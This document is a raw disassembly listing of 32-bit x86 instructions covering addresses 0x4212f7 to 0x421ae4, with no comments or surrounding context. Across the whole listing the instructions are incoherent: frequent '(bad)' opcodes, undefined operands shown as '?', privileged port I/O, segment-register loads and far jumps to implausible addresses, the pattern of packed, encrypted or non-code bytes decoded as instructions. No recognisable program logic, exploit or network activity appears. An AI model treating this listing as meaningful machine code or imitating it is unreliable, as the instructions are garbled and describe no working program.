  4212f7:	stos   BYTE PTR es:[edi],al
  4212f8:	int3   
  4212f9:	div    BYTE PTR [esi-0x69]
  4212fc:	mov    cs,WORD PTR [ebx+0x760ba76b]
  421302:	mov    ebp,0x46a992f1
  421307:	dec    edi
  421308:	cmc    
  421309:	pop    ds
  42130a:	rol    ebx,cl
  42130c:	mov    eax,0x89fb916
  421311:	jmp    0x5f4e250f
  421316:	mov    edx,0xc3ab6fb7
  42131b:	mov    dl,0xc8
  42131d:	dec    ecx
  42131e:	test   eax,0x9ae5b3d3
  421323:	mov    dl,0x6a
  421325:	mov    ah,0x10
  421327:	(bad)  
  421328:	je     0x42138f
  42132a:	sub    bl,BYTE PTR [eax-0x61]
  42132d:	je     0x4212e8
  42132f:	ja     0x4212e5
  421331:	lock ret 0x8c10
  421335:	hlt    
  421336:	push   ebp
  421337:	ins    BYTE PTR es:[edi],dx
  421338:	fdivr  QWORD PTR [ecx-0x44]
  42133b:	sub    ecx,DWORD PTR [eax+0x25ca98ff]
  421341:	fcmove st,st(5)
  421343:	sub    esp,DWORD PTR [eax+0x65]
  421346:	cmp    BYTE PTR [esi-0x6b7d27a4],al
  42134c:	pop    edi
  42134d:	(bad)  [ecx]
  42134f:	ret    0x1d14
  421352:	and    eax,DWORD PTR [esi-0xa]
  421355:	rcr    BYTE PTR [ecx+0x73a833d0],cl
  42135b:	test   BYTE PTR [edi-0x7f],dh
  42135e:	and    ebx,DWORD PTR [eax+ecx*2+0x1f]
  421362:	mov    dl,bh
  421364:	lods   eax,DWORD PTR ds:[esi]
  421365:	fwait
  421366:	nop
  421367:	adc    BYTE PTR [esi+edx*4+0x28],0xfc
  42136c:	sti    
  42136d:	cmc    
  42136e:	mov    bh,BYTE PTR [edi]
  421370:	js     0x4213b1
  421372:	stc    
  421373:	or     al,0x2d
  421375:	ret    
  421376:	jo     0x421364
  421378:	xor    DWORD PTR [edx-0x2fb405a4],ebx
  42137e:	or     BYTE PTR [edi+0x1000a012],dl
  421384:	mov    edx,0xed3e2302
  421389:	ins    DWORD PTR es:[edi],dx
  42138a:	mov    esi,0x62ca0671
  42138f:	sbb    ebx,esp
  421391:	inc    eax
  421392:	inc    eax
  421393:	cmp    DWORD PTR [eax+0x42e410dc],esi
  421399:	in     eax,dx
  42139a:	arpl   WORD PTR [eax-0x52],di
  42139d:	add    cl,BYTE PTR [edi]
  42139f:	mov    ebx,0xb02ed093
  4213a4:	dec    edx
  4213a5:	sub    ch,dh
  4213a7:	std    
  4213a8:	jo     0x4213c2
  4213aa:	mov    esp,0xe5acbdb
  4213af:	add    eax,0x46c2e9ab
  4213b4:	pop    esi
  4213b5:	mov    ebx,0x997390d7
  4213ba:	sub    dl,dh
  4213bc:	out    dx,al
  4213bd:	pop    ebx
  4213be:	jg     0x42135e
  4213c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213c1:	sar    BYTE PTR ds:0x67e53056,0xea
  4213c8:	jo     0x421365
  4213ca:	fistp  WORD PTR [edi+0x467844bb]
  4213d0:	or     DWORD PTR [esi+0x2dc03761],ecx
  4213d6:	addr16 pop edi
  4213d8:	dec    ebp
  4213d9:	mov    ah,0x71
  4213db:	jo     0x4213f1
  4213dd:	loopne 0x421457
  4213df:	or     esi,DWORD PTR [eax*4+0x1978ecbe]
  4213e6:	add    DWORD PTR [eax],eax
  4213e8:	out    dx,eax
  4213e9:	rol    DWORD PTR [ecx+0x5a],cl
  4213ec:	mov    ecx,0x9c1dba7a
  4213f1:	lods   al,BYTE PTR ds:[esi]
  4213f2:	mov    eax,ds:0x2165e747
  4213f7:	mov    ds:0x1fb6bb70,al
  4213fc:	nop
  4213fd:	into   
  4213fe:	mov    eax,ds:0x58d9a823
  421403:	(bad)  
  421404:	mov    dl,0x6f
  421406:	xor    eax,DWORD PTR [ebp+0x64bbc799]
  42140c:	mov    bh,0xec
  42140e:	(bad)  
  42140f:	jl     0x421440
  421411:	pop    ecx
  421412:	cwde   
  421413:	pop    ebx
  421414:	or     dl,al
  421416:	rcl    bl,cl
  421418:	inc    eax
  421419:	dec    ebp
  42141a:	and    DWORD PTR [esi-0x5dd6311c],edx
  421420:	cdq    
  421421:	gs cmp ah,dh
  421424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421425:	sub    al,0xd5
  421427:	mov    eax,DWORD PTR [ebx]
  421429:	enter  0xaab,0x6b
  42142d:	out    dx,eax
  42142e:	xor    eax,0x6d8f3020
  421433:	jge    0x421424
  421435:	xchg   ecx,eax
  421436:	cmp    bh,al
  421438:	nop
  421439:	ret    
  42143a:	xchg   esi,eax
  42143b:	shl    BYTE PTR [edi],0x13
  42143e:	adc    eax,0x378194ca
  421443:	out    dx,eax
  421444:	rcr    ebp,0xaf
  421447:	xchg   ebp,eax
  421448:	jle    0x421496
  42144a:	inc    esp
  42144b:	or     al,0x1e
  42144d:	loopne 0x421438
  42144f:	shl    BYTE PTR [ecx-0x478c86bd],0x53
  421456:	xchg   ebp,eax
  421457:	cmp    edi,ebp
  421459:	fstp   QWORD PTR [ecx+0x18]
  42145c:	sbb    DWORD PTR [ebp+0x731acc26],ecx
  421462:	fcom   DWORD PTR [edi-0x60]
  421465:	shl    DWORD PTR [edi+0x30ad21e4],cl
  42146b:	pop    esp
  42146c:	mov    bh,0x61
  42146e:	jnp    0x421437
  421470:	dec    edx
  421471:	movq   mm0,QWORD PTR [esi+ebp*8+0x4c939a94]
  421479:	add    eax,0x67bc55a8
  42147e:	jecxz  0x421424
  421480:	pop    esi
  421481:	loope  0x42146d
  421483:	lods   eax,DWORD PTR ds:[esi]
  421484:	pop    edx
  421485:	int    0x74
  421487:	jmp    0xa7ae:0x674eb518
  42148e:	jbe    0x4214b1
  421490:	and    cl,BYTE PTR [edi+0x767e47b9]
  421496:	lahf   
  421497:	xor    al,0xa7
  421499:	sub    eax,0xa938f9b1
  42149e:	ja     0x421425
  4214a0:	ds loop 0x421436
  4214a3:	fs (bad) 
  4214a5:	pop    esi
  4214a6:	jg     0x4214fb
  4214a8:	out    0x42,eax
  4214aa:	mov    ?,WORD PTR [esi-0x56229062]
  4214b0:	retf   
  4214b1:	and    bh,bh
  4214b3:	xchg   DWORD PTR [esi+0x66e3eeef],esi
  4214b9:	dec    eax
  4214ba:	pop    ecx
  4214bb:	jmp    0x9202:0xed81896b
  4214c2:	xor    al,0x34
  4214c4:	cmp    eax,0xc6ebdb44
  4214c9:	ret    
  4214ca:	fist   DWORD PTR [ecx]
  4214cc:	push   0x2b5909f2
  4214d1:	int3   
  4214d2:	test   ebp,ebp
  4214d4:	pop    esi
  4214d5:	pop    ebp
  4214d6:	pop    es
  4214d7:	mov    ecx,0x7e01b70
  4214dc:	(bad)  
  4214de:	mov    edi,0xfd3156c9
  4214e3:	adc    eax,0x8bdc6da2
  4214e8:	push   edi
  4214e9:	inc    esp
  4214ea:	test   al,0x74
  4214ec:	(bad)  
  4214ed:	fwait
  4214ee:	push   edi
  4214ef:	in     al,dx
  4214f0:	pop    esp
  4214f1:	jnp    0x4214a9
  4214f3:	xor    al,0x98
  4214f5:	pop    edi
  4214f6:	popa   
  4214f7:	iret   
  4214f8:	inc    ebp
  4214f9:	push   edi
  4214fa:	pushf  
  4214fb:	xor    bh,bl
  4214fd:	fidivr WORD PTR [esi+eax*1-0x71fda472]
  421504:	jmp    0x421542
  421506:	dec    edi
  421507:	jle    0x421509
  421509:	push   ebx
  42150a:	imul   eax,DWORD PTR [eax-0x7ac0f156],0xffffffd4
  421511:	jge    0x421572
  421513:	mov    dl,0x2
  421515:	add    bh,ch
  421517:	inc    ebp
  421518:	mov    ch,0xfe
  42151a:	in     eax,0xe5
  42151c:	rol    BYTE PTR [edi-0x7b93faac],cl
  421522:	leave  
  421523:	sub    DWORD PTR [eax-0x7a],eax
  421526:	call   0xdbe1d98c
  42152b:	dec    DWORD PTR [edx-0x491b5468]
  421531:	sahf   
  421532:	test   al,0xfb
  421534:	or     ebp,DWORD PTR [edi-0x8]
  421537:	inc    esp
  421538:	xchg   esi,eax
  421539:	mov    edx,0xdb5cdf71
  42153e:	sub    eax,0xbb668373
  421543:	xor    dl,ah
  421545:	push   cs
  421546:	add    al,0xe4
  421548:	lock push esp
  42154a:	jnp    0x421529
  42154c:	call   0x4d32:0x3d490454
  421553:	inc    edx
  421554:	push   ebx
  421555:	pop    ecx
  421556:	pop    esi
  421557:	dec    esp
  421558:	xchg   edx,eax
  421559:	pop    ecx
  42155a:	mov    al,ds:0x9446f37d
  42155f:	push   ebp
  421560:	cwde   
  421561:	xchg   esp,eax
  421562:	(bad)  
  421564:	sbb    al,0x16
  421566:	sbb    bh,dh
  421568:	cs retf 0x9f4a
  42156c:	repnz mov dh,0xf4
  42156f:	jae    0x42157b
  421571:	sahf   
  421572:	mov    al,al
  421574:	cs sub eax,0x98cb8964
  42157a:	push   edx
  42157b:	out    dx,al
  42157c:	pushf  
  42157d:	repnz inc ebx
  42157f:	in     al,0xd6
  421581:	adc    BYTE PTR [ebx-0x7c38b033],al
  421587:	jecxz  0x421561
  421589:	lods   al,BYTE PTR ds:[esi]
  42158a:	pop    edi
  42158b:	in     al,dx
  42158c:	cmp    esp,DWORD PTR [edx+0x6ded6e87]
  421592:	mov    al,0x13
  421594:	dec    eax
  421595:	cwde   
  421596:	scas   al,BYTE PTR es:[edi]
  421597:	cld    
  421598:	fadd   QWORD PTR [edi+0x49c4ec21]
  42159e:	(bad)
  4215a1:	ret    0xb6b8
  4215a4:	addr16 or al,0xd9
  4215a7:	sbb    al,0xbf
  4215a9:	adc    BYTE PTR ds:0xbd4964e1,cl
  4215af:	or     DWORD PTR [esi+esi*4+0x5984e5de],0x7a768db8
  4215ba:	scas   eax,DWORD PTR es:[edi]
  4215bb:	mov    ah,0x2d
  4215bd:	mov    WORD PTR [esi-0x45],cs
  4215c0:	jne    0x42157b
  4215c2:	test   eax,0x7e358319
  4215c7:	cdq    
  4215c8:	out    dx,eax
  4215c9:	leave  
  4215ca:	push   edx
  4215cb:	cmp    cl,BYTE PTR [esi+0x1d]
  4215ce:	je     0x4215d9
  4215d0:	jecxz  0x42162b
  4215d2:	test   BYTE PTR [ecx+0x29],0xd6
  4215d6:	dec    eax
  4215d7:	ja     0x421566
  4215d9:	push   0x5
  4215db:	scas   al,BYTE PTR es:[di]
  4215dd:	pusha  
  4215de:	xlat   BYTE PTR ds:[ebx]
  4215df:	mov    eax,ds:0xdbc8099f
  4215e4:	mov    ds:0x7ac06398,eax
  4215e9:	aad    0x3a
  4215eb:	mov    bl,0x91
  4215ed:	cmp    al,0xa8
  4215ef:	inc    ebx
  4215f0:	push   ss
  4215f1:	loop   0x421594
  4215f3:	xchg   ebx,eax
  4215f4:	rcl    DWORD PTR [ecx+0x4c],0x2d
  4215f8:	aas    
  4215f9:	lods   al,BYTE PTR ds:[esi]
  4215fa:	call   0xd789ca0d
  4215ff:	int    0x37
  421601:	push   edx
  421602:	out    dx,eax
  421603:	pusha  
  421604:	sbb    BYTE PTR [edi+esi*8],dl
  421607:	pop    es
  421608:	dec    esi
  421609:	mov    ds,ecx
  42160b:	das    
  42160c:	aaa    
  42160d:	push   ss
  42160e:	repnz lock in al,0xed
  421612:	push   ecx
  421613:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421615:	add    dh,bl
  421617:	repnz push cs
  421619:	sbb    edi,DWORD PTR [ebx+0x756a0db3]
  42161f:	mov    edx,0xe0a4643f
  421624:	inc    eax
  421625:	pop    ebp
  421626:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421627:	xchg   esi,eax
  421628:	xlat   BYTE PTR ds:[ebx]
  421629:	mov    eax,0xa31d9307
  42162e:	add    ecx,edi
  421630:	mov    ds,WORD PTR [ebx-0x5a434304]
  421636:	jg     0x42161e
  421638:	mov    al,0x71
  42163a:	xchg   esp,eax
  42163b:	jg     0x421657
  42163d:	jmp    0xb04f:0xfa32fc1c
  421644:	aaa    
  421645:	or     al,0x7b
  421647:	mov    edi,0xf30935cf
  42164c:	fild   WORD PTR [ebx+0x6d]
  42164f:	push   ebx
  421650:	test   eax,0xe5e45add
  421655:	mov    BYTE PTR [ebx],ch
  421657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421658:	lock aam 0x8d
  42165b:	(bad)  
  42165c:	mov    edi,0x90777e1a
  421661:	and    dl,BYTE PTR [ebx]
  421663:	mov    cs,WORD PTR [ebx]
  421665:	jne    0x42165a
  421667:	call   0xa65e4abb
  42166c:	gs dec ecx
  42166e:	loope  0x42168a
  421670:	and    ch,dl
  421672:	dec    edx
  421673:	or     al,0xc8
  421675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421676:	sub    eax,0xf71de7a8
  42167b:	pusha  
  42167c:	sbb    BYTE PTR [esi+0x72],cl
  42167f:	call   DWORD PTR [edx+0x2d]
  421682:	popf   
  421683:	lds    ebx,FWORD PTR [edx-0x43719afd]
  421689:	jae    0x42167e
  42168b:	bound  ebp,QWORD PTR [esi+0xc]
  42168e:	xor    edx,DWORD PTR [esi-0x44]
  421691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421692:	js     0x421670
  421694:	idiv   esi
  421696:	jl     0x421683
  421698:	aaa    
  421699:	mov    dl,cl
  42169b:	je     0x421701
  42169d:	out    dx,al
  42169e:	(bad)  
  42169f:	sbb    eax,0x69f36782
  4216a4:	imul   DWORD PTR [esi-0x36]
  4216a7:	mov    ebp,0x8d58b053
  4216ac:	call   0xcc10f858
  4216b1:	scas   eax,DWORD PTR es:[edi]
  4216b2:	mov    ds,WORD PTR [edi]
  4216b4:	fldcw  WORD PTR [eax-0x2b]
  4216b7:	jl     0x421685
  4216b9:	pop    esi
  4216ba:	adc    eax,DWORD PTR [eax]
  4216bc:	push   ss
  4216bd:	xor    eax,0xc3950468
  4216c2:	lods   eax,DWORD PTR ds:[esi]
  4216c3:	sub    bl,BYTE PTR [ecx-0x11cdd77]
  4216c9:	and    BYTE PTR [esi-0x132fac2d],0x72
  4216d0:	mov    ebx,?
  4216d2:	repnz fbstp TBYTE PTR [ebx]
  4216d5:	mov    ebx,0xfe37f70c
  4216da:	out    0x3e,al
  4216dc:	cdq    
  4216dd:	fcom   DWORD PTR [eax-0x1b9cee8a]
  4216e3:	pop    ebp
  4216e4:	imul   ebx,DWORD PTR [esi],0xdbb18185
  4216ea:	adc    al,0x7f
  4216ec:	mov    ax,WORD PTR [eax]
  4216ef:	lds    eax,FWORD PTR [esi]
  4216f1:	push   ss
  4216f2:	mov    cl,0xbe
  4216f4:	hlt    
  4216f5:	cs xchg esp,esi
  4216f8:	or     BYTE PTR [esi+0x43],ah
  4216fb:	push   cs
  4216fc:	xor    al,0xcc
  4216fe:	popf   
  4216ff:	ret    
  421700:	retf   0x64da
  421703:	add    BYTE PTR [ebx+0x7fea1350],ch
  421709:	stos   BYTE PTR es:[edi],al
  42170a:	add    al,BYTE PTR [edx]
  42170c:	ds ret 0xd60c
  421710:	and    edx,ebx
  421712:	push   0x34354283
  421717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421718:	xor    esi,DWORD PTR [edi]
  42171a:	loope  0x421774
  42171c:	ja     0x4db6cdf5
  421722:	and    BYTE PTR [esi+0x56abd201],dh
  421728:	or     edx,DWORD PTR [edx+ecx*2-0x7cb4d3d5]
  42172f:	adc    dh,BYTE PTR [ebx]
  421731:	jae    0x4216ee
  421733:	push   edi
  421734:	inc    edi
  421735:	call   0xd389ffde
  42173a:	ins    DWORD PTR es:[edi],dx
  42173b:	out    0x96,eax
  42173d:	js     0x42178b
  42173f:	and    DWORD PTR [ebp-0x7166e5a4],ebp
  421745:	sub    BYTE PTR [eax],0xa8
  421748:	repz jb 0x4217c3
  42174b:	mov    eax,0xa2b2e473
  421750:	or     BYTE PTR [edi+0x71b362a7],ch
  421756:	xchg   DWORD PTR [ecx],ecx
  421758:	fisubr DWORD PTR [esi+0x393110d8]
  42175e:	cmp    DWORD PTR [ebx+0x3],eax
  421761:	add    edx,DWORD PTR [edx+ecx*4]
  421764:	jge    0x421715
  421766:	bnd jb 0x42178a
  421769:	mov    ?,WORD PTR [ecx-0x742bf743]
  42176f:	and    ah,BYTE PTR ds:0xfe31e760
  421775:	cmp    al,BYTE PTR [edx]
  421777:	or     DWORD PTR [edx-0x40c55d15],eax
  42177d:	jno    0x4217a5
  42177f:	repnz or ebx,esi
  421782:	push   esp
  421783:	adc    BYTE PTR ss:[ecx],cl
  421786:	cmp    DWORD PTR [eax],edi
  421788:	fist   DWORD PTR ds:[ecx+esi*1]
  42178c:	lods   al,BYTE PTR ds:[esi]
  42178d:	not    BYTE PTR [edi+0x2d]
  421790:	push   edi
  421791:	leave  
  421792:	inc    ecx
  421793:	mov    edx,0x5197e531
  421798:	add    DWORD PTR [eax-0x2953e9e9],0xd236c10c
  4217a2:	popf   
  4217a3:	inc    eax
  4217a4:	arpl   WORD PTR [eax],bx
  4217a6:	cld    
  4217a7:	je     0x4217e6
  4217a9:	call   0xc17db9ee
  4217ae:	push   ebx
  4217af:	icebp  
  4217b0:	mov    ebp,DWORD PTR [esi]
  4217b2:	mov    ebp,0xb0f98bdf
  4217b7:	jl     0x421772
  4217b9:	sbb    al,0x31
  4217bb:	add    bl,ch
  4217bd:	mov    ebx,DWORD PTR [esi-0x327ce11e]
  4217c3:	stos   DWORD PTR es:[edi],eax
  4217c4:	(bad)  
  4217c5:	int    0xf6
  4217c7:	call   0x218b:0x9dce945b
  4217ce:	stos   DWORD PTR es:[edi],eax
  4217cf:	fcmovu st,st(7)
  4217d1:	data16 (bad) 
  4217d3:	or     ch,BYTE PTR [ebx-0x29442880]
  4217d9:	dec    edx
  4217da:	pop    es
  4217db:	and    al,0xf2
  4217dd:	or     DWORD PTR [eax-0x4f0c270c],0xe432044a
  4217e7:	push   esp
  4217e8:	mov    bh,bh
  4217ea:	xchg   edi,eax
  4217eb:	ins    BYTE PTR es:[edi],dx
  4217ec:	mov    ds:0x16b72b44,eax
  4217f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217f2:	jge    0x4217b7
  4217f4:	test   DWORD PTR [ebp-0x7cd2cec6],0xaf3c3054
  4217fe:	push   ss
  4217ff:	xchg   esi,eax
  421800:	popa   
  421801:	or     al,cl
  421803:	adc    BYTE PTR [ebx],0xb5
  421806:	sub    dh,bh
  421808:	aam    0x8
  42180a:	fwait
  42180b:	cmc    
  42180c:	dec    edx
  42180d:	dec    ecx
  42180e:	into   
  42180f:	jae    0x42186b
  421811:	inc    ecx
  421812:	inc    edx
  421813:	xchg   ebx,eax
  421814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421815:	push   0xffffffa6
  421817:	mov    bh,bl
  421819:	jp     0x421869
  42181b:	xor    ebp,edx
  42181d:	fistp  WORD PTR [eax-0x5f6c2dab]
  421823:	imul   ebp,DWORD PTR ds:0x3feec088,0x58fabf06
  42182d:	in     eax,0x66
  42182f:	mov    dh,0xd5
  421831:	icebp  
  421832:	mov    ch,BYTE PTR [ebx-0x2653123e]
  421838:	fwait
  421839:	jecxz  0x421836
  42183b:	add    DWORD PTR [ecx],edx
  42183d:	loope  0x42185a
  42183f:	rcl    BYTE PTR [ecx],1
  421841:	(bad)  
  421842:	in     eax,dx
  421843:	add    BYTE PTR ds:0x2b994bcc,dl
  421849:	jle    0x42181a
  42184b:	add    ebp,DWORD PTR ds:0x9aed3043
  421851:	or     BYTE PTR [ebp-0x6d0dc13d],bh
  421857:	xchg   ebp,eax
  421858:	sbb    DWORD PTR [esi],ecx
  42185a:	jne    0x421895
  42185c:	pop    ebx
  42185d:	jae    0x4217f5
  42185f:	xor    edx,0xc651ba35
  421865:	ret    0x2baf
  421868:	xchg   DWORD PTR ds:0xf6b04bb9,esp
  42186e:	mov    al,0x3f
  421870:	sbb    dl,dl
  421872:	pop    edx
  421873:	inc    eax
  421874:	fdivr  QWORD PTR [esi+0x33]
  421877:	and    BYTE PTR [edx+0x77],dl
  42187a:	jbe    0x421861
  42187c:	pusha  
  42187d:	test   DWORD PTR [ecx+0x2e33c845],0xd6db2b0c
  421887:	ds and eax,0xc397b41c
  42188d:	jl     0x421896
  42188f:	in     al,dx
  421890:	rcl    BYTE PTR [esi-0x49720c55],1
  421896:	mov    edx,0xbb14324d
  42189b:	addr16 mov esi,0xa827642a
  4218a1:	push   0xffffffed
  4218a3:	fwait
  4218a4:	jo     0x421863
  4218a6:	push   0x55f9efe1
  4218ab:	popa   
  4218ac:	stos   DWORD PTR es:[edi],eax
  4218ad:	fwait
  4218ae:	add    bl,BYTE PTR [edi-0x34]
  4218b1:	enter  0xeffd,0xa8
  4218b5:	mov    WORD PTR [esi-0x2ec027c7],ds
  4218bb:	lods   eax,DWORD PTR ds:[esi]
  4218bc:	pop    ecx
  4218bd:	fstp   DWORD PTR [eax]
  4218bf:	jecxz  0x421894
  4218c1:	cmp    al,0xca
  4218c3:	dec    esi
  4218c4:	mov    dh,0x48
  4218c6:	sbb    al,dl
  4218c8:	js     0x42189b
  4218ca:	pushf  
  4218cb:	dec    edi
  4218cc:	xor    bh,al
  4218ce:	fld    DWORD PTR [edi]
  4218d0:	fcom   QWORD PTR [ecx]
  4218d2:	loope  0x4218d2
  4218d4:	cmp    cl,al
  4218d6:	int3   
  4218d7:	sub    bh,BYTE PTR [eax+0x2ffe6866]
  4218dd:	dec    edi
  4218de:	push   eax
  4218df:	lds    esi,FWORD PTR [edi+0x51161e98]
  4218e5:	dec    ebp
  4218e6:	xchg   ecx,eax
  4218e7:	dec    ebx
  4218e8:	jbe    0x421964
  4218ea:	jb     0x421885
  4218ec:	lods   eax,DWORD PTR ds:[esi]
  4218ed:	and    dh,BYTE PTR [edi-0x3b]
  4218f0:	push   esi
  4218f1:	shl    DWORD PTR [ebx+0x54],0x11
  4218f5:	xlat   BYTE PTR ds:[ebx]
  4218f6:	sbb    DWORD PTR [ebx],ebx
  4218f8:	push   esi
  4218f9:	jno    0x421962
  4218fb:	ins    DWORD PTR es:[edi],dx
  4218fc:	stos   BYTE PTR es:[edi],al
  4218fd:	push   es
  4218fe:	(bad)  
  4218ff:	xchg   edx,eax
  421900:	sub    BYTE PTR [esi-0x2e4da6e1],0xbd
  421907:	jb     0x42190c
  421909:	loope  0x421974
  42190b:	(bad)  
  42190d:	icebp  
  42190e:	pop    edx
  42190f:	call   0xc5bcb906
  421914:	xor    BYTE PTR [edx+0x6d],bh
  421917:	or     esp,DWORD PTR [ecx+0x44562a90]
  42191d:	sbb    ebp,ecx
  42191f:	adc    al,0x49
  421921:	fcmovnb st,st(1)
  421923:	jp     0x4218f8
  421925:	stos   BYTE PTR es:[edi],al
  421926:	sub    eax,0x4a60c391
  42192b:	sub    al,BYTE PTR [ebx+0x7f]
  42192e:	jg     0x42199a
  421930:	xor    DWORD PTR [esi+0x6522c288],0xa948741e
  42193a:	movsx  ecx,WORD PTR cs:[eax]
  42193e:	push   ss
  42193f:	retf   0x8d8c
  421942:	std    
  421943:	cmc    
  421944:	xchg   esi,eax
  421945:	jnp    0x4219a3
  421947:	add    bl,BYTE PTR [edi+0x59]
  42194a:	test   DWORD PTR [ebx+0x2b7c5c24],ecx
  421950:	and    al,0x7d
  421952:	fs gs iret 
  421955:	inc    edi
  421956:	aas    
  421957:	fucomp st(1)
  421959:	or     ebp,edi
  42195b:	outs   dx,BYTE PTR ds:[esi]
  42195c:	pop    ss
  42195d:	push   cs
  42195e:	iret   
  42195f:	ins    BYTE PTR es:[edi],dx
  421960:	and    esp,DWORD PTR [edx+0x5c]
  421963:	mov    ds:0x4d45401b,al
  421968:	addr16 inc ecx
  42196a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42196b:	lds    ecx,FWORD PTR [edx]
  42196d:	cmp    BYTE PTR [esi],al
  42196f:	mov    dl,BYTE PTR [edi+0x24]
  421972:	pop    esp
  421973:	rol    DWORD PTR [ebx+0x5a],cl
  421976:	xchg   edx,eax
  421977:	cdq    
  421978:	mov    ds:0x2ae444b9,al
  42197d:	xor    BYTE PTR [esi+0x6f8ee382],0x7a
  421984:	daa    
  421985:	sahf   
  421986:	stos   DWORD PTR es:[edi],eax
  421987:	push   edi
  421988:	lds    edx,FWORD PTR [ecx]
  42198a:	pop    esp
  42198b:	jp     0x4219f3
  42198d:	fidivr DWORD PTR [edx+0x32]
  421990:	mov    cl,0x3e
  421992:	jno    0x42199c
  421994:	fsub   st(7),st
  421996:	and    cl,BYTE PTR [edi-0x23]
  421999:	jno    0x4219db
  42199b:	or     DWORD PTR [ecx+0x4b9a0025],esp
  4219a1:	loopne 0x4219ce
  4219a3:	xchg   edx,eax
  4219a4:	pop    ss
  4219a5:	jp     0x42194d
  4219a7:	and    ecx,DWORD PTR [edi]
  4219a9:	xor    esi,DWORD PTR [edx-0x42965314]
  4219af:	(bad)
  4219b2:	add    ebx,DWORD PTR [ecx-0x31f82d71]
  4219b8:	push   edx
  4219b9:	pop    esi
  4219ba:	or     dl,BYTE PTR [ecx+edx*2+0x5e]
  4219be:	bound  ebx,QWORD PTR [ebx-0x5e66368f]
  4219c4:	ins    BYTE PTR es:[edi],dx
  4219c5:	add    al,0xa5
  4219c7:	bound  ecx,QWORD PTR [edi-0x139d3071]
  4219cd:	sub    BYTE PTR [eax-0x25],bh
  4219d0:	enter  0x2243,0x3
  4219d4:	in     eax,0x66
  4219d6:	add    DWORD PTR [esi+edx*4+0x66],ecx
  4219da:	std    
  4219db:	mov    bl,0x82
  4219dd:	in     al,dx
  4219de:	dec    esp
  4219df:	mov    esp,0x1ffa25f0
  4219e4:	add    al,0x47
  4219e6:	iret   
  4219e7:	jle    0x4219a3
  4219e9:	sbb    DWORD PTR [eax],esp
  4219eb:	stos   DWORD PTR es:[edi],eax
  4219ec:	inc    esi
  4219ed:	loopne 0x4219c1
  4219ef:	xor    BYTE PTR [edx],0x46
  4219f2:	cmp    al,0x75
  4219f4:	or     bh,BYTE PTR [esi+eax*2-0x26]
  4219f8:	sub    al,0xa
  4219fa:	inc    esp
  4219fb:	push   0xe29589a9
  421a00:	pop    ds
  421a01:	adc    DWORD PTR [eax+0x27],edx
  421a04:	sbb    eax,0xbc948416
  421a09:	fwait
  421a0a:	outs   dx,BYTE PTR ds:[esi]
  421a0b:	adc    eax,0x5c2ce626
  421a10:	data16 out 0xcc,al
  421a13:	jle    0x421a4e
  421a15:	dec    edi
  421a16:	and    al,0xf7
  421a18:	mov    esi,DWORD PTR [eax+eiz*8]
  421a1b:	test   DWORD PTR [ebp-0x8],edi
  421a1e:	jae    0x421a87
  421a20:	jb     0x421a59
  421a22:	adc    eax,0x7522c520
  421a27:	add    ecx,DWORD PTR [ebx+0x63]
  421a2a:	add    BYTE PTR [ecx],bl
  421a2c:	fwait
  421a2d:	adc    bl,bh
  421a2f:	jbe    0x421a6d
  421a31:	cwde   
  421a32:	daa    
  421a33:	bound  edx,QWORD PTR [ebp+0x2d]
  421a36:	lods   eax,DWORD PTR ds:[esi]
  421a37:	pop    esi
  421a38:	jecxz  0x421a14
  421a3a:	inc    edi
  421a3b:	jnp    0x421a4a
  421a3d:	mov    al,0xce
  421a3f:	cmp    BYTE PTR [ecx-0x52],bl
  421a42:	lods   eax,DWORD PTR ds:[esi]
  421a43:	repnz cmp ah,bl
  421a46:	data16 stos BYTE PTR es:[edi],al
  421a48:	jecxz  0x421ac3
  421a4a:	jne    0x4219ea
  421a4c:	lea    esi,[ebp+0x5c]
  421a4f:	add    BYTE PTR [ebx-0x36a5ee3e],al
  421a55:	mov    bh,0xd6
  421a57:	test   al,0x6d
  421a59:	int3   
  421a5a:	imul   DWORD PTR [esi+0x4a]
  421a5d:	push   esi
  421a5e:	mov    al,0x86
  421a60:	push   edi
  421a61:	in     eax,0xa2
  421a63:	jmp    0x421ab6
  421a65:	inc    ecx
  421a66:	jb     0x421ab7
  421a68:	xchg   esi,eax
  421a69:	adc    BYTE PTR [eax-0x5451a40e],ah
  421a6f:	inc    edx
  421a70:	or     al,0x87
  421a72:	inc    esi
  421a73:	inc    esi
  421a74:	jg     0x421a5a
  421a76:	popa   
  421a77:	ins    BYTE PTR es:[edi],dx
  421a78:	jne    0x421acd
  421a7a:	adc    eax,0x9c382308
  421a7f:	push   ss
  421a80:	mov    ebp,0xfd18a395
  421a85:	mov    eax,0xdbdba68d
  421a8a:	lea    edx,[ebx+0xc42943a]
  421a90:	xchg   edx,eax
  421a91:	mov    dh,0xb9
  421a93:	(bad)  
  421a94:	cli    
  421a95:	xor    BYTE PTR [esi+0x44],al
  421a98:	sbb    eax,0xbd96293f
  421a9d:	test   al,0x51
  421a9f:	rcl    DWORD PTR [ebp-0x3e47fd98],1
  421aa5:	je     0x421a4d
  421aa7:	jmp    0x1e31:0xe3ff82b5
  421aae:	lods   eax,DWORD PTR ds:[esi]
  421aaf:	bound  edi,QWORD PTR [ecx-0x40]
  421ab2:	add    esi,esp
  421ab4:	out    dx,al
  421ab5:	rcr    BYTE PTR [ebp+ecx*4-0x1d257737],0x63
  421abd:	shl    BYTE PTR [eax+0x14],0x3c
  421ac1:	lock adc al,0x60
  421ac4:	jp     0x421b06
  421ac6:	out    dx,eax
  421ac7:	clc    
  421ac8:	cmp    ebp,DWORD PTR [edi+0x4]
  421acb:	out    0x36,al
  421acd:	xor    al,0xc7
  421acf:	cli    
  421ad0:	xor    al,0xbc
  421ad2:	add    DWORD PTR [eax-0x75d32644],eax
  421ad8:	mov    edx,0x5fecf92e
  421add:	or     BYTE PTR [edx-0x1f],0x3d
  421ae1:	in     eax,0xe9
  421ae3:	inc    esi
  421ae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
